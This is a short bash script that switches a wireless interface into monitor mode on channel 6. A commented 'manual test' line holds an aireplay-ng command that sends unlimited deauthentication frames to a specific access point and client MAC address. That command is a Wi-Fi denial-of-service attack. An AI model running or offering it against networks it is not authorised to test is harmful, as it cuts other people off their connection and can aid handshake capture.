#!/bin/bash

sudo iwconfig wlan1 power off
sudo iwconfig wlan1 mode monitor
sudo iwconfig wlan1 up
sudo iwconfig wlan1 channel 6

# Test manuel: sudo aireplay-ng -0 0 -a C4:06:83:53:4F:E7 -c 14:d1:69:6f:26:c1 wlan1